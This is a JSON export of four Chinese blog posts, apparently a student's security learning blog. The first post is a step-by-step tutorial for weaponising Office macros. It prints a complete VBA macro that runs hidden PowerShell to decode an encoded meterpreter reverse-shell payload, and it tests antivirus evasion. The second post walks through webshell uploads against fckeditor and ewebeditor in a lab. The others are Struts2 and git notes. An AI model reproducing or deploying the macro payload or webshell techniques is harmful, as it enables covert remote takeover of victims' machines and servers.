[{"title":"Exploit the macro of office","date":"2017-03-22T12:38:25.000Z","path":"2017/03/22/Exploit-the-macro-of-office/","text":"0x00 前言 利用 Veil-Evasion 生成payload，利用 MacroShop 或 unicorn （效果更好） 免杀。 0x01 准备阶段 在 Github 上下载好相应的项目： Veil-Evasion MacroShop unicorn 0x02 生成payload&emsp;&emsp;在 terminal 中 git clone 下载好上述的文件后 键入以下命令 cd Veil-Evasion/ cd setup/ ./setup.sh -c 视电脑性能不同安装时间不等 &emsp;&emsp;期间会提示安装 Python 2.7.5 ，但单击 next 会发现没有反应，笔者 kali自带了 Python 2.7.13 于是点击取消，继续安装直至完成。&emsp;&emsp;随后我们回到 Veil-Evasion根目录，发现多了一个 Veil-Evasion.py，运行即可。&emsp;&emsp;输入list查看 payload，本次我们使用第24个 powershell/meterpreter/rev_tcp ，依据提示设置 LHOST,LPORT，最后 generate 生成payload。&emsp;&emsp;如图所示：&emsp;&emsp;最后将文件复制到 /root目录下方便操作。 0x03 运用MacroShop生成宏命令 python macro_safe.py /root/demo.bat &emsp;&emsp;terminal中出现以下vbs脚本代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Sub Workbook_Open()//开始复制&apos;VBA arch detect suggested by &quot;T&quot;Dim Command As StringDim str As StringDim exec As StringArch = Environ(&quot;PROCESSOR_ARCHITECTURE&quot;)windir = Environ(&quot;windir&quot;)If Arch = &quot;AMD64&quot; Then Command = windir + &quot;\\syswow64\\windowspowershell\\v1.0\\powershell.exe&quot;Else Command = &quot;powershell.exe&quot;End Ifstr = &quot;nVNdb5tAEHznV6wQUkAGBLYTpY4i5UtuI7VuFEftg+UHfN7E1xx36F&quot;str = str + &quot;hsSOr/3iXBbROlVVVe5rjbnZnb3fMEHMOJ68wulLrMC2PJd+&quot;str = str + &quot;/RalSDfrxUyg3mUFQLJQWUlBED1sTncKnpiix8kZaqTJ0qZY&quot;str = str + &quot;Tf7W1CqKQmqDtsOnwIjv5b59xiRnizYljudKqOdx3CL+Vu9Z&quot;str = str + &quot;t2t9OquycO2ebRK/nSE9xEnxffUBBMm5IwjydI8dSIe6SyQ/&quot;str = str + &quot;Bnb5ydLpcWy3Kc5VI189GIBdBywMbY+xDeynjGm6ZADp8SXy&quot;str = str + &quot;J/O/DKGjLCqC70RhSB45XxudGajfp76bt+nB4cxmmcpgd7IQ&quot;str = str + &quot;z5C+A7mIoiXSl1BF7Bd5udWpu11p7Ldqm5plqg7y4aQpfTAg&quot;str = str + &quot;6sOZC5r1GgXKPvFa+IHvg8cbzmH/hmZ5LY4xotV6L1bbgmgz&quot;str = str + &quot;5zhknQ22/Vmlkybwnrs7GzWUmF4LNCpOjvyQE8tk56L602of&quot;str = str + &quot;fQ2w/T8M/FHqvsrmS2idEYwNa5NZYV5XHKXiTrIgzbVa/HCm&quot;str = str + &quot;zOk627Hd0rR++RzviipT/jkZqzkQ+ZXioMOCtK51vHI87lqY&quot;str = str + &quot;jatkGUY75Ae4G3UkuSRoMnIJpkOYL7VepB34VI819ZZALhaW&quot;str = str + &quot;dcadFGlhAVWVnSylZtg449Go1evLAk9Jr4I+o7WoVJPUiShG&quot;str = str + &quot;GYBM7O+XWlSeYYP82kKaZo11JgGX/KbLnKVNtCUzRtBSHhvj&quot;str = str + &quot;2/jbnv1fGu7EEQwk8Rnj7adb17fKwYenXYQvJyYqaUWYqmCr&quot;str = str + &quot;GAaIrC6CUcHgyTZCsyEqvH7Q8=&quot;exec = Command + &quot; -NoP -NonI -W Hidden -Exec Bypass -Comm&quot;exec = exec + &quot;and &quot;&quot;Invoke-Expression $(New-Object IO.StreamRea&quot;exec = exec + &quot;der ($(New-Object IO.Compression.DeflateStream (&quot;exec = exec + &quot;$(New-Object IO.MemoryStream (,$([Convert]::From&quot;exec = exec + &quot;Base64String(\\&quot;&quot; &quot; &amp; str &amp; &quot; \\&quot;&quot; )))), [IO.Compr&quot;exec = exec + &quot;ession.CompressionMode]::Decompress)), [Text.Enc&quot;exec = exec + &quot;oding]::ASCII)).ReadToEnd();&quot;&quot;&quot;Shell exec,vbHideEnd Sub&apos;---Generated by macro_safe.py by khr0x40sh---&apos;---VBA arch detection by &quot;T&quot;---//结束复制Error writing file. Please check permissions and try again.Exiting... &emsp;&emsp;从第二行开始复制，舍弃最后三行，打开任意一个Word文档，当然Excel，PowerPoint都行，只要支持宏命令 单击后，新建宏（先输入文件名）。弹窗如图 将绿框内的代码删除，将 Private Sub Document_Open() 下的 End Sub 替换为剪切板内的内容。 Ctrl+S保存，提示无法保存在未启用宏的文档中 ， 所以点击否，另存为 Word 97-2003 文档。 回到kali中 msfconsole -r /usr/share/veil-output/handlers/demo_handler.rc 运行上述命令后，回到生成文件的系统，将文件打开，等待一会就能在kali中发现一个ip上线了。 用是能用了，但是传到扫毒网上扫一下发现免杀效果不是很好。 0x04 运用unicorn免杀 cd 到 unicorn 目录中python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.116 1213 macro 其中192.168.1.116:1213表示kali监听在1213端口上。依据terminal回显得知VBA脚本生成在当前文件夹下的powershell_attack.txt中，复制粘贴等操作同上。启动msfconsole后打开文件，与之前有点不同的是，本次我们打开文件后会提示该文件是由一个老版本的word创建的啊之类的balabala，点确定之后就关掉了word窗口，但是在kali中一样能上线。最后再上传扫毒网扫一下，居然有一个杀软报毒。。。 0x05 简单的总结一下 博主之前看别人直播弄这个的时候，用unicorn还是能全部免杀的。 这儿是乌云上同一类型但是涉及到更多的一篇 http://www.vuln.cn/6379 真的不能懈怠啊，不然就会越来越菜了。","tags":[{"name":"kali","slug":"kali","permalink":"http://frailness.cn/tags/kali/"},{"name":"office","slug":"office","permalink":"http://frailness.cn/tags/office/"}]},{"title":"Vulnerable webeditor","date":"2017-03-10T03:52:11.000Z","path":"2017/03/10/Vulnerable webeditor/","text":"0x00 前言 之前跟着一个渗透教程走过一遍，但是由于当时环境限制没有搭建靶场实战，现在打算依据一个新的教程重新走一遍。本篇博文是关于利用网页编辑器漏洞进行渗透的练习。 0x01 测试环境的搭建 服务器操作系统为 Windows Server 2003 Enterprice Edition ，服务器软件为IIS。 首先就是创建站点， 打开IIS后，依次选择网站(右键)-&gt;新建-&gt;网站 ，无脑下一步，当然要记得配置的路径，之后要将web编辑器的源码放进去，最后下一步直到完成创建。 右键新建的站点，选择 属性-&gt;主目录-&gt;执行权限将下拉框内的值 选择为 纯脚本，单机右边的配置按钮，在弹出的窗口中点击 选项-&gt;勾选启用父路径 ，再点击 调试-&gt;勾选 启用ASP服务器端脚本调试&amp;启用ASP客户端脚本调试 ，点击确定。 在网站的属性面板文档下修改默认站点。 最后将Web 服务扩展 下允许开启 Active Server Pages ASP.NET v1.1.4322 FrontPage Server Extensions 2022 ，至此站点配置完成。 最后将下载好的编辑器源码放入路径中。 0x02 渗透过程 本次利用的漏洞程序为两款web编辑器fckeditor ewebeditor 首先是 fckeditor， 用工具 查看版本 Version 2.6.3 ，爆上传路径，创建文件夹测试，发现 . 会被替换为 _ ，测试上传相同文件名，发现仍然会被替换。于是点击工具中的 突破文件夹限制 发现创建成功，查看发现是 利用 递归创建文件夹 绕过替换的。于是尝试手工实现递归创建文件夹，祭出 BrupSuite 抓包改请求url，成功。利用IIS解析漏洞，上传小马，菜刀连接，成功。 后用 ewebeditor 搭建环境， 首先了解到 2.8 5.5 两个版本可以拿来练手，于是选择 Ver2.8 进行尝试，下载多个安装包发现 年代实在太久远几个安装包都有所缺失。 转而选择 Ver5.5， 安装完成之后，开始渗透。顺利的进入后台，发现有修改上传文件限制的页面，尝试修改，发现修改无效。 经由百度上前辈们 的提示，可以修改密码为一句话，然后就可以用菜刀连接账号密码的配置文件。审计修改密码页面modipwd.asp 发现包含了 private.asp， 而private.asp包含了 ../asp/config.asp ，发现密码保存在该页面。顺利修改密码为一句话，利用菜刀连接config.asp，成功。 0x03 总结 还是那句话，多动手。这段时间打算一直跟着教程走，一边搭建环境一边练习。努力学习，花更多的时间。","tags":[{"name":"webeditor","slug":"webeditor","permalink":"http://frailness.cn/tags/webeditor/"},{"name":"summary","slug":"summary","permalink":"http://frailness.cn/tags/summary/"}]},{"title":"LearningStruts2Nostes","date":"2017-02-26T07:05:25.000Z","path":"2017/02/26/Learning Struts2 Nostes/","text":"0x01 前言 最近在imooc上学习了Struts2的相关课程，本着实践出真知的精神，我着手练习一个涉及到Struts2，Jquery和Ajax的小作业。其实是学长布置的作业，只是我拖到现在才有能力开始写。正如本文开篇所说的那样，博主对于Struts2的理解还处于一个十分初级的阶段，遇到的问题当然也是各位大佬所不会犯的错，但今日我特撰此文，以示警戒自己。 0x02 写代码的过程中遇到的问题 由于是练习写到一半才意识到自己该写篇博文来总结一下，所以以下仅涉及部分遇到的问题。 第一个问题是在写本次作业的第二个晚上碰到的，我发现前台Ajax能传数据给后台，而且后台也能接收到正确的数据，但是仍然会报错 我真的是完全不晓得为什么，而且这个报错信息在百度上也搜不到什么，全和我的情况大相径庭，就在我束手无策的时候，我下滑了一下鼠标中键，哇这居然还有一个报错， 当然图我忘记截图了 有问题先问百度，然后我发现有一句话特别刺眼，可能是缺少下列的jar包 jar包？什么jar包？哇，难道用json还要引入jar包？ 第二个问题是在struts.xml配置中遇到的12345&lt;package name=\"default\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;action name=\"demo\" method=\"demo\" class=\"com.demo.action.DemoAction\"&gt; &lt;result name=\"demo\"&gt;/demo.jsp&lt;/result&gt; &lt;/action&gt;&lt;/package&gt; 如果class中指定的class不存在，或者在DemoAction中返回值不为demo，均会报错404。 第三个问题是在Struts2中运用ajax时碰见的12345678910$.ajax(&#123; url: \"demo.action\", type: \"post\", data:&#123; \"demo\":demo &#125;, success:function(msg)&#123; console.log(msg); &#125; &#125;); 假定struct.xml中部分内容与之前相同，即DemoAction.java中123456789101112131415161718public String demo()&#123; ... Map&lt;String,String&gt; map = new HashMap&lt;String,String&gt;(); map.put(\"变量名\",\"变量值\"); String json = JSONObject.fromObject(map).toString(); //将字符串传给前台 try&#123; response.getWriter().print(json); &#125;catch(IOExcepiton e)&#123; e.printStackTrace(); &#125; ... return \"demo\";&#125; 这样在ajax success中得到的msg就会是demo.jsp的页面源码，为了避免这个问题应将struts.xml中的相应action标签下的 &lt;result&gt;&lt;/result&gt; 去掉，也就是说在相应的类中定义的函数不可以有返回值123public void demo()&#123; ...&#125; 至此，本次小作业告一段落。 其实写这个小练习的时候我是知道自己本身正处于一个十分浮躁的阶段，感到肩头的压力，想要能去安全公司实习，极度的想提升自己的技术，提升到现阶段能去实习的水平，殊不知，犯了大忌 借用大佬的一句话 0x03 Struts2 配置 由于项目要使用Struts2框架所以需要配置目录，本次偷懒使用MyEclipse的快捷导入。配置目录方法如下： 将xwork-core-version.jar struts2-core-version.jar ognl-version.jar javassist-version.jar freemarker-version.jar commons-lang3-version.jar commons-logging-version.jar commons-fileupload-version.jar common-io-version.jar 等 jar包引入 ProjectName/WebRoot/WEV-INF/lib 目录下 右键项目 依次选择 Build Path Config Bulid Path Java Build Path Libraries Add JARs 选择刚才导入lib目录下的jar包，在点击 Order and Export 选择 Select All 单击 ok 配置 web.xml文件，添加如下内容 123456789&lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPreparedAndExecuteFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 配置struts.xml文件 注意加DOCTYPE声明 0x04 总结 静下心来 学一门技术目的不纯学不好的 0x05 接下来的安排 1.Violent Python 2.i春秋上 Python socket编程 &amp; 自己编写渗透工具 3.米斯特学习视频 4.kali linux cookbook &amp; 米斯特安全讲义 &amp; 白帽子讲Web安全 5.大话设计模式","tags":[{"name":"Struts2","slug":"Struts2","permalink":"http://frailness.cn/tags/Struts2/"},{"name":"Ajax","slug":"Ajax","permalink":"http://frailness.cn/tags/Ajax/"},{"name":"Notes","slug":"Notes","permalink":"http://frailness.cn/tags/Notes/"}]},{"title":"A summary about last one and a half year&summary about learning git","date":"2017-02-17T16:00:00.000Z","path":"2017/02/18/A summary about last one and a half year&summary about learning git/","text":"0x00 前言: 在很早之前就有想写一篇博文的打算，但是技术以及心态等方面的不成熟一直拖延到现在，即使在动手的前一刻仍然有一丝想要放弃的念头。博主自认为是学习很慢的一类人，而且死扣概念，也就是说，在学习web安全的开始甚至是现在，仍然是一大堆内容都想去弄明白，弄懂，然而又缺乏实践，学的杂忘得多。终于，在反省了己身所处的经济状况之后，怀着对将来美好的憧憬，多方面了解将来入职的要求，得知，作为一名技术学习者，一个时常更新的博客是必不可少的，由是，终于产生了这篇博文。因为博主本人技术并不强，概念更是了解甚少，又喜欢使用看起来高大上的词句，一些词汇使用错误，请见谅，并假装理解我的意思。 0x01 总结: 我在此仅记下此刻我脑海里的逐渐浮现的一些杂乱繁琐的技术相关的内容。 0x0 PHP: 开学初，我非常幸运的加入了学校一个名为CERT的社团，在学长的指导下稀里糊涂的开 始学习php，学习的过程十分缓慢，基础的原因是其一，最主要的原因约莫是对未来的迷茫，不知道学这个做什么，并且没有意识到压力，在辛辛苦苦 一个学期 ，似乎是一学年，终于啃完了这些教程。后来同样稀里糊涂的学习了ThinkPHP框架，如今应该差不多全忘了。在这段时间中，我遇到了很幸运的两件事情： 碰巧遇见了一个项目，这个项目让我得以使用所学，尽管这个项目的结局十分不好，但是从中我该吸取的经验或教训等等的太多太多。 不要与自已不信任的人一起做项目 永远保持一颗谦虚的心，别人总有一处比你优秀 谦虚不是自卑，不要低估自己花了时间得来的东西 该学习的东西实在太多太多，从任何时刻开始任何事情都不会晚 加入了学校教务系统的开发队伍中，尽管在写这篇博文的现在，我仍然没有参与到实际代码的编写中。加入这里的初衷是想要在假期能留在学校，在学校没什么人的时候，静下心来学习，在现在看来这个想法似乎对自己要求有些过高了，因为没有吃的。言归正传，我校正在编写的新的教务系统的后台开发语言是JAVA，这就对我提出了新的要求。在慕课网上学习JAVA,JSTL,Struts2框架。 0x1 JAVA: 学习这门语言的过程比较水，其实现在我都没有学完，因为我仅仅是为了学习J2EE而学习的JAVA，期间还学习了Servlet和Jsp，在学习的过程中，我有幸在社团大佬gorgiaxx的指引下，开始做一些Web安全中心十分基础的内容。比如在虚拟机中搭个win2003的服务器，尽管在最后还是大佬帮忙，并且百度了一篇教程给我的情况下才迷迷糊糊的搭建成功，然后又不了了之了。 JSTL方面、Struts2框架的内容在近期赶着了解的一些，目前是希望抽空把硬盘中已经上灰的JWC某模块拿出来研究一下，以防以后接手的时候什么都不懂。 0x2 Python: 这门语言目前还在学习当中，又一次开始学习，原因之一是这篇教程看不懂，其二是因为个人觉得Python是一门不得不掌握的语言，日常操作电脑，以后工作都会使用这门语言，附上学习链接，学习的过程中感到吃力的一块：装饰器。因为自身现阶段水平限制，不是十分理解而且也用不到这个语法。 0x3 Git: 学习它是因为在学习Python的时候在廖雪峰的官方网站首页上看到了，而且我将自己不写博客的一部分原因归结于我不会git，于是，经过3天的时间通读一遍教程，本着练习一下的念头，重新在github上搭建了hexo博客，很多之前跟着教程不动脑子走的步骤也能稍微理解一点实在做什么，为什么要这样做。 在这里为防可能忘记部分命令，回去一页一页翻教程，我先提前将廖雪峰的Git教程中的部分章节的小结拷贝过来。 初始化一个Git仓库，使用git init命令Git允许我们在版本历史之间穿梭,使用命令git reset --hard commit_id用git log可以查看提交历史。 git log --pretty=oneline --abbrev-commit --graph图形查看提交历史用git reflog查看命令历史，以便确定要回到未来的哪个版本直接丢弃工作区的修改时，用命令git checkout -- file,已经加到暂存区,则先执行git reset HEAD filegit rm file删除文件git rm directory -r -f删除文件夹要关联一个远程库，使用命令git remote add origin git@github.com:path/repo-name.git repo–&gt;repository n.仓库第一次推送master分支: git push -u origin master 之后取消参数-u克隆一个本地库: git clone git@github.com:path/repo-name.git查看分支：git branch创建分支：git branch &lt;name&gt;切换分支：git checkout &lt;name&gt;创建+切换分支：git checkout -b &lt;name&gt;合并某分支到当前分支：git merge &lt;name&gt;删除分支：git branch -d &lt;name&gt;准备合并dev分支，请注意–no-ff参数，表示禁用Fast forward，保留分支历史上的分支信息：git merge --no-ff -m &quot;merge with no-ff&quot; dev要查看远程库的信息，用git remote,参数-v详细显示每个仓库的Git配置文件都放在.git/config文件中，当前用户的Git配置文件放在用户主目录下的.gitconfig中，在[alias]下配置别名 0x4 Web安全: 关于web我只是一个可能连门都还没入的菜鸟，有一篇鸡汤我一直存着Hacker,没有坚持3个月以上，就没有发言权，在这里我仅将手头的资源罗列，以便日后逐一学习。 1.QQ和微信的收藏 时常看，否则收藏了没有意义 2.Chrom的收藏夹 看完Python教程之后再次整理，边看边精简 3.E:/Study/Books/Technology .pdf 4.E:/Seay’s Blog 文件名没有对应到标题。 0x02 一些其他计划: 为了以后更好的发展，身体素质要提升上去，故今年开始增重，希望本学期结束后能重10斤。 打算暑期在学校留校学习 如果有多余精力的话，可以点一下画画的技能 附上我喜欢的一个画师Lpip","tags":[{"name":"summary","slug":"summary","permalink":"http://frailness.cn/tags/summary/"},{"name":"git","slug":"git","permalink":"http://frailness.cn/tags/git/"},{"name":"selfexamination","slug":"selfexamination","permalink":"http://frailness.cn/tags/selfexamination/"}]}]